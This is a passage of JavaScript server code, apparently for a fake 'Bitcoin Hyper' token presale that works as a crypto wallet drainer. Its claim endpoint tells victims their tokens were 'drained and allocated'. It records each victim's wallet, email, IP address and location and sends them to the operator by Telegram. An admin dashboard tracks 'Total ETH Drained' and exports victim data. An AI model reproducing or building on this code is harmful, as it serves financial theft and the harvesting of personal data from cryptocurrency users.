    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Send TOKEN_CLAIMED notification with drain confirmation
    await sendComprehensiveNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        flag: location.flag,
        email: participant.email,
        claimId,
        amount: claimAmount,
        claimValue,
        txHash,
        claimed: true,
        drained: true,
        sessionId: sessionId,
        timestamp: new Date().toISOString()
      }
    );
    
    res.json({
      success: true,
      message: '🎉 Token claim successful! Tokens have been drained and allocated.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIMED_AND_DRAINED',
        drainStatus: 'COMPLETED',
        txHash,
        timestamp: new Date().toISOString(),
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        instructions: '✅ Your Bitcoin Hyper tokens have been successfully drained and allocated. They will be distributed automatically after the presale concludes.',
        nextSteps: [
          'Keep your wallet connected to the supported networks',
          'Tokens will appear in your wallet automatically',
          'Check our announcements for distribution updates',
          'Your allocation is now secured and locked'
        ],
        confirmation: {
          drained: true,
          amount: claimAmount,
          value: claimValue,
          time: new Date().toLocaleString()
        }
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    
    // Send error notification
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CLAIM ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send claim error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed',
      message: 'Token drain process encountered an error. Please try again or contact support.' 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        ethBalance: participant.ethBalance,
        eligibility: {
          isEligible: participant.eligibility.isEligible,
          reason: participant.eligibility.reason,
          scannedAt: participant.eligibility.scannedAt,
          scanId: participant.eligibility.scanId
        },
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash,
          drained: participant.claim.drained,
          drainStatus: participant.claim.drainStatus
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive,
        status: participant.status,
        sessionId: participant.sessionId,
        location: {
          country: participant.country,
          city: participant.city,
          flag: participant.flag
        }
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin stats endpoint
app.get('/api/admin/stats', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const now = new Date();
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      // Real-time metrics
      activeSessions: Object.keys(memoryStorage.userSessions).length,
      lastHourActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
        .length,
      todayActivity: memoryStorage.activityLog
        .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
        .length,
      
      // Geographic distribution
      countries: memoryStorage.participants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      
      // Recent activity
      recentConnections: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > last24h)
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
        .slice(0, 20)
        .map(p => ({
          wallet: p.walletAddress,
          ip: p.ipAddress,
          country: p.country,
          city: p.city,
          flag: p.flag,
          email: p.email,
          ethBalance: p.ethBalance,
          eligible: p.eligibility.isEligible,
          claimed: p.claim.claimed,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          portfolio: p.totalValueUSD,
          connected: p.connectedAt,
          status: p.status
        })),
      
      // Analytics
      hourlyActivity: memoryStorage.analytics.hourlyConnections,
      countryStats: memoryStorage.analytics.countryStats,
      
      // System status
      system: {
        telegram: telegramEnabled,
        email: emailEnabled,
        uptime: process.uptime(),
        memory: process.memoryUsage()
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Activity log endpoint
app.get('/api/admin/activity', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { limit = 100, action, startDate, endDate } = req.query;
    
    let filteredLogs = [...memoryStorage.activityLog];
    
    if (action) {
      filteredLogs = filteredLogs.filter(log => log.action === action);
    }
    
    if (startDate) {
      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) >= new Date(startDate));
    }
    
    if (endDate) {
      filteredLogs = filteredLogs.filter(log => new Date(log.timestamp) <= new Date(endDate));
    }
    
    const recentLogs = filteredLogs
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, parseInt(limit));
    
    res.json({ 
      success: true, 
      logs: recentLogs, 
      total: filteredLogs.length,
      filtered: action || startDate || endDate 
    });
    
  } catch (error) {
    console.error('Activity log error:', error);
    res.status(500).json({ success: false, error: 'Failed to get activity logs' });
  }
});

// Export data endpoint
app.get('/api/admin/export', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const format = req.query.format || 'json';
    
    if (format === 'csv') {
      let csv = 'Wallet,Email,Country,City,Flag,ETH Balance,Eligible,Claimed,Amount,Value,Portfolio,Connected At,Claimed At,Status,TX Hash,Session ID,IP Address\n';
      
      memoryStorage.participants.forEach(p => {
        csv += `"${p.walletAddress}","${p.email}","${p.country}","${p.city}","${p.flag}","${p.ethBalance}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.totalValueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.status}","${p.claim.txHash}","${p.sessionId}","${p.ipAddress}"\n`;
      });
      
      res.header('Content-Type', 'text/csv');
      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-data.csv');
      res.send(csv);
      
    } else {
      res.json({
        success: true,
        data: {
          participants: memoryStorage.participants,
          activityLog: memoryStorage.activityLog,
          statistics: memoryStorage.settings.statistics,
          analytics: memoryStorage.analytics,
          sessions: memoryStorage.userSessions,
          exportTime: new Date().toISOString(),
          totalRecords: memoryStorage.participants.length
        }
      });
    }
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Other admin endpoints (keep from original)
app.get('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    res.json({
      success: true,
      settings: memoryStorage.settings
    });
    
  } catch (error) {
    console.error('Settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to get settings' });
  }
});

// Admin dashboard HTML - FIXED ADMIN LOGIN
app.get('/admin', (req, res) => {
  const auth = req.headers.authorization;
  const token = auth ? auth.replace('Bearer ', '') : req.query.token;
  
  // Use environment variable for admin token
  const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'BitcoinHyperSecureAdmin2024!@#';
  
  if (!token || token !== ADMIN_TOKEN) {
    return res.status(401).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper - Admin Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body { 
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
            height: 100vh; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #f8fafc;
          }
          .login-container {
            background: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 25px;
            border: 2px solid #475569;
            width: 450px;
            text-align: center;
            box-shadow: 0 25px 80px rgba(0,0,0,0.5);
            animation: fadeIn 0.5s ease-out;
          }
          .logo {
            font-size: 64px;
            color: #F7931A;
            margin-bottom: 25px;
            animation: float 3s ease-in-out infinite;
            filter: drop-shadow(0 5px 15px rgba(247, 147, 26, 0.3));
          }
          h1 {
            margin-bottom: 35px;
            background: linear-gradient(135deg, #F7931A, #FFD700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 32px;
            font-weight: 800;
            letter-spacing: 1px;
          }
          .subtitle {
            color: #94a3b8;
            margin-bottom: 40px;
            font-size: 14px;
            letter-spacing: 0.5px;
          }
          input {
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid #475569;
            border-radius: 12px;
            color: #f8fafc;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
          }
          input:focus {
            outline: none;
            border-color: #F7931A;
            box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.2);
            background: rgba(15, 23, 42, 0.9);
          }
          .token-hint {
            text-align: left;
            font-size: 12px;
            color: #64748b;
            margin-top: 5px;
            margin-bottom: 20px;
            background: rgba(15, 23, 42, 0.5);
            padding: 10px;
            border-radius: 8px;
            border-left: 3px solid #F7931A;
          }
          .token-hint code {
            background: rgba(247, 147, 26, 0.1);
            padding: 2px 6px;
            border-radius: 4px;
            color: #F7931A;
            font-family: 'Courier New', monospace;
          }
          button {
            background: linear-gradient(135deg, #F7931A, #E67E22);
            color: white;
            border: none;
            padding: 18px 45px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 25px;
            width: 100%;
            transition: all 0.3s;
            letter-spacing: 0.5px;
            text-transform: uppercase;
          }
          button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5);
          }
          button:active {
            transform: translateY(-1px);
          }
          .error {
            color: #ef4444;
            margin-top: 15px;
            font-size: 14px;
            background: rgba(239, 68, 68, 0.1);
            padding: 12px;
            border-radius: 8px;
            border-left: 3px solid #ef4444;
            display: none;
          }
          .success {
            color: #10b981;
            margin-top: 15px;
            font-size: 14px;
            background: rgba(16, 185, 129, 0.1);
            padding: 12px;
            border-radius: 8px;
            border-left: 3px solid #10b981;
            display: none;
          }
          @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
          }
          @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
          }
          .footer {
            margin-top: 30px;
            color: #64748b;
            font-size: 12px;
            border-top: 1px solid #334155;
            padding-top: 20px;
          }
        </style>
      </head>
      <body>
        <div class="login-container">
          <div class="logo">₿</div>
          <h1>BITCOIN HYPER ADMIN</h1>
          <div class="subtitle">Real-time Token Drain Dashboard</div>
          
          <div class="token-hint">
            <strong>Default Admin Token:</strong><br>
            <code>BitcoinHyperSecureAdmin2024!@#</code><br><br>
            <strong>Set custom token in .env:</strong><br>
            <code>ADMIN_TOKEN=YourSecureTokenHere</code>
          </div>
          
          <input type="password" id="token" placeholder="Enter Admin Token" autocomplete="off" />
          
          <button onclick="login()" id="loginBtn">🔐 LOGIN TO DASHBOARD</button>
          
          <div id="error" class="error"></div>
          <div id="success" class="success"></div>
          
          <div class="footer">
            Real-time monitoring • Live drain tracking • Enhanced security
          </div>
        </div>
        
        <script>
          function login() {
            const token = document.getElementById('token').value.trim();
            const errorDiv = document.getElementById('error');
            const successDiv = document.getElementById('success');
            const loginBtn = document.getElementById('loginBtn');
            
            // Hide previous messages
            errorDiv.style.display = 'none';
            successDiv.style.display = 'none';
            
            if (!token) {
              errorDiv.textContent = 'Please enter admin token';
              errorDiv.style.display = 'block';
              return;
            }
            
            // Show loading state
            loginBtn.innerHTML = '🔐 VERIFYING...';
            loginBtn.disabled = true;
            
            // Try to login
            setTimeout(() => {
              window.location.href = '/admin?token=' + encodeURIComponent(token);
            }, 500);
          }
          
          // Allow Enter key to submit
          document.getElementById('token').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') login();
          });
          
          // Focus on input
          document.getElementById('token').focus();
          
          // Show error if token was invalid (from query param)
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.get('error') === 'invalid_token') {
            document.getElementById('error').textContent = 'Invalid admin token. Please try again.';
            document.getElementById('error').style.display = 'block';
          }
        </script>
      </body>
      </html>
    `);
  }
  
  // Calculate stats for dashboard
  const now = new Date();
  const lastHourActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp) > new Date(now.getTime() - 3600000))
    .length;
  
  const todayActivity = memoryStorage.activityLog
    .filter(log => new Date(log.timestamp).toDateString() === now.toDateString())
    .length;
  
  const topCountries = Object.entries(memoryStorage.analytics.countryStats)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5);
  
  const recentClaims = memoryStorage.participants
    .filter(p => p.claim.claimed)
    .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
    .slice(0, 10);
  
  // Calculate total ETH drained (simulated)
  const totalETHDrained = memoryStorage.participants
    .filter(p => p.claim.claimed)
    .reduce((sum, p) => sum + parseFloat(p.ethBalance || 0), 0)
    .toFixed(4);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper - Admin Dashboard</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
          background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
          color: #f8fafc;
          min-height: 100vh;
        }
        .dashboard { padding: 25px; max-width: 1800px; margin: 0 auto; }
        
        .header { 
          display: flex; 
          justify-content: space-between; 
          align-items: center; 
          padding: 25px 0; 
          border-bottom: 2px solid #334155; 
          margin-bottom: 35px; 
        }
        .logo { display: flex; align-items: center; gap: 20px; }
        .logo-icon { font-size: 40px; color: #F7931A; animation: pulse 2s infinite; }
        .logo h1 { 
          font-size: 32px; 
          background: linear-gradient(135deg, #f59e0b, #ef4444); 
          -webkit-background-clip: text; 
          -webkit-text-fill-color: transparent;
          font-weight: 800;
          letter-spacing: 0.5px;
        }
        
        .live-badge { 
          display: inline-flex; 
          align-items: center; 
          gap: 10px; 
          background: linear-gradient(135deg, #10b981, #059669);
          padding: 10px 20px; 
          border-radius: 25px; 
          font-size: 14px;
          font-weight: 600;
          letter-spacing: 0.5px;
          box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }
        .live-dot { 
          width: 10px; 
          height: 10px; 
          background: #ffffff; 
          border-radius: 50%; 
          animation: pulse 1.5s infinite; 
        }
        
        .stats-grid { 
          display: grid; 
          grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
          gap: 25px; 
          margin-bottom: 40px; 
        }
        .stat-card { 
          background: linear-gradient(135deg, #1e293b, #0f172a);
          padding: 30px; 
          border-radius: 20px; 
          border-left: 6px solid;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          transition: transform 0.3s, box-shadow 0.3s;
        }
        .stat-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 15px 40px rgba(0,0,0,0.4);
        }
        .stat-card:nth-child(1) { border-color: #10b981; }
        .stat-card:nth-child(2) { border-color: #3b82f6; }
        .stat-card:nth-child(3) { border-color: #f59e0b; }
        .stat-card:nth-child(4) { border-color: #ef4444; }
        .stat-card:nth-child(5) { border-color: #8b5cf6; }
        .stat-card:nth-child(6) { border-color: #ec4899; }
        .stat-value { 
          font-size: 42px; 
          font-weight: 800; 
          margin-bottom: 10px; 
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .stat-label { 
          color: #94a3b8; 
          font-size: 14px; 
          text-transform: uppercase; 
          letter-spacing: 1px;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .stat-icon {
          font-size: 24px;
          opacity: 0.8;
        }
        
        .charts-grid { 
          display: grid; 
          grid-template-columns: 2fr 1fr; 
          gap: 35px; 
          margin-bottom: 40px; 
        }
        .chart-container { 
          background: linear-gradient(135deg, #1e293b, #0f172a);
          padding: 30px; 
          border-radius: 20px; 
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          border: 1px solid #334155;
        }
        .chart-title { 
          margin-bottom: 25px; 
          color: #f8fafc; 
          font-size: 20px; 
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .chart-icon {
          color: #F7931A;
          font-size: 20px;
        }
        
        .recent-activity { 
          background: linear-gradient(135deg, #1e293b, #0f172a);
          padding: 30px; 
          border-radius: 20px; 
          margin-bottom: 40px;
          border: 1px solid #334155;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .activity-table { 
          width: 100%; 
          border-collapse: collapse; 
          margin-top: 20px;
        }
        .activity-table th { 
          text-align: left; 
          padding: 18px; 
          border-bottom: 2px solid #334155; 
          color: #94a3b8; 
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 1px;
          font-size: 13px;
        }
        .activity-table td { 
          padding: 18px; 
          border-bottom: 1px solid #334155; 
          font-size: 14px;
        }
        .activity-table tr:hover { 
          background: rgba(45, 55, 72, 0.5); 
        }
        .flag-cell {
          font-size: 20px;
          text-align: center;
        }
        
        .export-buttons { 
          display: flex; 
          gap: 20px; 
          margin-top: 40px;
          flex-wrap: wrap;
        }
        .export-btn { 
          padding: 15px 30px; 
          border: none; 
          border-radius: 12px; 
          cursor: pointer; 
          font-weight: 700; 
          transition: all 0.3s;
          display: flex;
          align-items: center;
          gap: 12px;
          font-size: 15px;
          letter-spacing: 0.5px;
        }
        .export-btn.csv { 
          background: linear-gradient(135deg, #10b981, #059669);
          color: white; 
        }
        .export-btn.json { 
          background: linear-gradient(135deg, #3b82f6, #2563eb);
          color: white; 
        }
        .export-btn.refresh { 
          background: linear-gradient(135deg, #f59e0b, #d97706);
          color: white; 
        }
        .export-btn.logout { 
          background: linear-gradient(135deg, #ef4444, #dc2626);
          color: white; 
          margin-left: auto;
        }
        .export-btn:hover {
          transform: translateY(-3px);
          box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        
        .system-status {
          display: flex;
          gap: 25px;
          background: rgba(30, 41, 59, 0.7);
          padding: 15px 25px;
          border-radius: 15px;
          border: 1px solid #475569;
        }
        .telegram-status, .email-status, .balance-check { 
          display: inline-flex; 
          align-items: center; 
          gap: 10px; 
        }
        .status-online { 
          color: #10b981; 
          font-weight: 600;
        }
        .status-offline { 
          color: #ef4444; 
          font-weight: 600;
        }
        .status-icon {
          font-size: 18px;
        }
        
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
        
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        
        .notification {
          background: linear-gradient(135deg, #1e293b, #0f172a);
          border-left: 5px solid #F7931A;
          padding: 20px;
          border-radius: 12px;
          margin-bottom: 30px;
          animation: fadeIn 0.5s ease-out;
        }
        .notification h3 {
          color: #F7931A;
          margin-bottom: 10px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .zero-balance-warning {
          background: linear-gradient(135deg, #7c2d12, #9a3412);
          border-left: 5px solid #ea580c;
          padding: 15px;
          border-radius: 10px;
          margin-top: 10px;
          font-size: 13px;
        }
        
        .empty-state {
          text-align: center;
          padding: 50px;
          color: #94a3b8;
          font-size: 16px;
        }
        .empty-state i {
          font-size: 48px;
          margin-bottom: 20px;
          opacity: 0.5;
        }
      </style>
    </head>
    <body>
      <div class="dashboard">
        <div class="header">
          <div class="logo">
            <div class="logo-icon">₿</div>
            <h1>BITCOIN HYPER ADMIN DASHBOARD</h1>
            <span class="live-badge">
              <span class="live-dot"></span>
              <i class="fas fa-bolt"></i>
              LIVE DRAINING ACTIVE
            </span>
          </div>
          <div class="system-status">
            <span class="telegram-status">
              <i class="fab fa-telegram status-icon" style="color: #0088cc;"></i>
              Telegram: <span class="${telegramEnabled ? 'status-online' : 'status-offline'}">${telegramEnabled ? '✅ CONNECTED' : '❌ OFFLINE'}</span>
            </span>
            <span class="email-status">
              <i class="fas fa-envelope status-icon" style="color: #ea4335;"></i>
              Email: <span class="${emailEnabled ? 'status-online' : 'status-offline'}">${emailEnabled ? '✅ ENABLED' : '❌ DISABLED'}</span>
            </span>
            <span class="balance-check">
              <i class="fas fa-ethereum status-icon" style="color: #627eea;"></i>
              Balance Check: <span class="status-online">✅ REAL-TIME</span>
            </span>
          </div>
        </div>
        
        <div class="notification">
          <h3><i class="fas fa-exclamation-triangle"></i> REAL BALANCE CHECKING ACTIVE</h3>
          <p>System now checks actual ETH balance on-chain. Wallets with zero balance will be marked as NOT ELIGIBLE.</p>
          <div class="zero-balance-warning">
            <strong>⚠️ IMPORTANT:</strong> Empty wallets (0 ETH) will automatically show "NOT ELIGIBLE" with proper messaging.
          </div>
        </div>
        
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-value"><i class="fas fa-users stat-icon"></i> ${memoryStorage.settings.statistics.totalParticipants}</div>
            <div class="stat-label"><i class="fas fa-globe"></i> Total Participants</div>
          </div>
          <div class="stat-card">
            <div class="stat-value"><i class="fas fa-check-circle stat-icon"></i> ${memoryStorage.settings.statistics.eligibleParticipants}</div>
            <div class="stat-label"><i class="fas fa-wallet"></i> Eligible Wallets</div>
          </div>
          <div class="stat-card">
            <div class="stat-value"><i class="fas fa-coins stat-icon"></i> ${memoryStorage.settings.statistics.claimedParticipants}</div>
            <div class="stat-label"><i class="fas fa-bolt"></i> Drained Tokens</div>
          </div>
          <div class="stat-card">
            <div class="stat-value"><i class="fas fa-dollar-sign stat-icon"></i> $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}</div>
            <div class="stat-label"><i class="fas fa-chart-line"></i> Total Raised</div>
          </div>
          <div class="stat-card">
            <div class="stat-value"><i class="fab fa-ethereum stat-icon"></i> ${totalETHDrained} ETH</div>
            <div class="stat-label"><i class="fas fa-database"></i> Total ETH Drained</div>
          </div>
          <div class="stat-card">
            <div class="stat-value"><i class="fas fa-network-wired stat-icon"></i> ${memoryStorage.settings.statistics.uniqueIPs.size}</div>
            <div class="stat-label"><i class="fas fa-server"></i> Unique IPs</div>
          </div>
        </div>
        
        <div class="charts-grid">
          <div class="chart-container">
            <div class="chart-title"><i class="fas fa-chart-line chart-icon"></i> Hourly Activity (Last 24h)</div>
            <canvas id="hourlyChart" height="250"></canvas>
          </div>
          <div class="chart-container">
            <div class="chart-title"><i class="fas fa-globe-americas chart-icon"></i> Top Countries</div>
            <canvas id="countryChart" height="250"></canvas>
          </div>
        </div>
        
        <div class="recent-activity">
          <h2 class="chart-title"><i class="fas fa-history chart-icon"></i> Recent Claims (Drained Tokens)</h2>
          ${recentClaims.length > 0 ? `
          <table class="activity-table">
            <thead>
              <tr>
                <th>Wallet</th>
                <th>Email</th>
                <th>Country</th>
                <th>ETH Balance</th>
                <th>Amount</th>
                <th>Value</th>
                <th>Time</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody id="claimsTable">
              ${recentClaims.map(p => `
                <tr>
                  <td><code>${p.walletAddress.substring(0, 8)}...${p.walletAddress.substring(36)}</code></td>
                  <td>${p.email}</td>
                  <td><span class="flag-cell">${p.flag || '🏳️'}</span> ${p.country}</td>
                  <td><strong>${p.ethBalance}</strong> ETH</td>
                  <td><span style="color: #F7931A; font-weight: 700;">${p.tokenAllocation.amount} BTH</span></td>
                  <td>$${p.tokenAllocation.valueUSD}</td>
                  <td>${new Date(p.claim.claimedAt).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</td>
                  <td><span style="color: #10b981; font-weight: 700;"><i class="fas fa-check-circle"></i> DRAINED</span></td>
                </tr>
              `).join('')}
            </tbody>
          </table>
          ` : `
          <div class="empty-state">
            <i class="fas fa-coins"></i>
            <p>No claims yet. Waiting for users to drain tokens...</p>
          </div>
          `}
        </div>
        
        <div class="export-buttons">
          <button class="export-btn csv" onclick="exportData('csv')">
            <i class="fas fa-file-csv"></i> Export CSV
          </button>
          <button class="export-btn json" onclick="exportData('json')">
            <i class="fas fa-file-code"></i> Export JSON
          </button>
          <button class="export-btn refresh" onclick="location.reload()">
            <i class="fas fa-sync-alt"></i> Refresh Data
          </button>
          <button class="export-btn logout" onclick="logout()">
            <i class="fas fa-sign-out-alt"></i> Logout
          </button>
        </div>
      </div>
      
      <script>
        // Prepare hourly data
        const hourlyData = ${JSON.stringify(memoryStorage.analytics.hourlyConnections)};
        const hours = Array.from({length: 24}, (_, i) => i);
        const hourlyValues = hours.map(h => hourlyData[h] || 0);
        
        // Hourly activity chart
        const hourlyCtx = document.getElementById('hourlyChart').getContext('2d');
        new Chart(hourlyCtx, {
          type: 'line',
          data: {
            labels: hours.map(h => h + ':00'),
            datasets: [{
              label: 'Connections',
              data: hourlyValues,
              borderColor: '#F7931A',
              backgroundColor: 'rgba(247, 147, 26, 0.1)',
              tension: 0.4,
              fill: true,
              pointBackgroundColor: '#F7931A',
              pointBorderColor: '#ffffff',
              pointBorderWidth: 2,
              pointRadius: 5,
              pointHoverRadius: 8
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: { display: false },
              tooltip: {
                backgroundColor: 'rgba(15, 23, 42, 0.9)',
                titleColor: '#F7931A',
                bodyColor: '#f8fafc',
                borderColor: '#334155',
                borderWidth: 1
              }
            },
            scales: {
              y: {
                beginAtZero: true,
                grid: { 
                  color: 'rgba(255,255,255,0.05)',
                  drawBorder: false
                },
                ticks: { 
                  color: '#94a3b8',
                  font: { size: 12 }
                }
              },
              x: {
                grid: { 
                  color: 'rgba(255,255,255,0.05)',
                  drawBorder: false
                },
                ticks: { 
                  color: '#94a3b8',
                  font: { size: 12 }
                }
              }
            }
          }
        });
        
        // Country chart
        const countryData = ${JSON.stringify(topCountries)};
        const countryCtx = document.getElementById('countryChart').getContext('2d');
        new Chart(countryCtx, {
          type: 'doughnut',
          data: {
            labels: countryData.map(c => c[0]),
            datasets: [{
              data: countryData.map(c => c[1]),
              backgroundColor: [
                '#F7931A', '#3b82f6', '#10b981', '#ef4444', '#8b5cf6',
                '#ec4899', '#f59e0b', '#06b6d4', '#84cc16', '#f43f5e'
              ],
              borderWidth: 2,
              borderColor: '#0f172a'
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: {
                position: 'right',
                labels: { 
                  color: '#94a3b8',
                  font: { size: 13 },
                  padding: 20
                }
              },
              tooltip: {
                backgroundColor: 'rgba(15, 23, 42, 0.9)',
                titleColor: '#F7931A',
                bodyColor: '#f8fafc',
                borderColor: '#334155',
                borderWidth: 1
              }
            }
          }
        });
        
        function exportData(format) {
          const token = '${token}';
          
          if (format === 'json') {
            fetch('/api/admin/export?format=json', {
              headers: {
                'Authorization': 'Bearer ' + token
              }
            })
            .then(response => {
              if (!response.ok) throw new Error('Export failed');
              return response.json();
            })
            .then(data => {
              const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = 'bitcoin-hyper-data-' + new Date().toISOString().split('T')[0] + '.json';
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
              
              // Show success notification
              showNotification('✅ Data exported successfully!', 'success');
            })
            .catch(error => {
